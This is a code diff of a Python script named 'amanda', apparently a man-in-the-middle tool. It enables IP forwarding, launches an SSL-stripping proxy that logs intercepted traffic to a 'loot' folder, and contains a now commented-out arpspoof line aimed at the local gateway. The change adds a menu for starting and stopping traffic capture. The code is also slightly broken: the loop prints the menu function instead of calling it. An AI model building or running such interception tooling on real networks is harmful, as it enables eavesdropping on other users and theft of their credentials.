@@ -8,10 +8,15 @@ ps={}
 port=8100
 term='xterm -geometry 30x5'
 version="0.1a"
+dr = makeloot('amanda')
 
-menu="""
-q - Quit
-"""
+def menu():
+  if "cap" in ps: capv="Stop"
+  else: capv="Start"
+  print("c - %s traffic capture" % capv)
+  print("d - Open loot foldes (%s)" % dr)
+  print("q - Quit quietly")
+
 usage="""
 You are running amanda [Nexzei Edition]
 
@@ -52,17 +57,17 @@ def clean():
 if True:
   gate, iface = getifgate()
   setup(port)
-  dr = makeloot('amanda')
   print ("  --- Amanda %s by Nexzei ---\n" % version)
   print ("Targeting %s at %s via port %s" % (gate, iface, port))
   print ("Saving to %s" % dr)
   reroute4("1")
   ps['ssls']=x('%s -e "ssls -k -l %d -w %s"' % (term, port, dr+"ssls.log"))
-  ps['arp']=x('%s -e "arpspoof -i %s %s"' % (term, iface, gate))
+  #ps['arp']=x('%s -e "arpspoof -i %s %s"' % (term, iface, gate))
   i = None
   while True:
     print(menu)
     i = input("> ")
     if i=="q": break;
+
   clean()
 #except: clean()
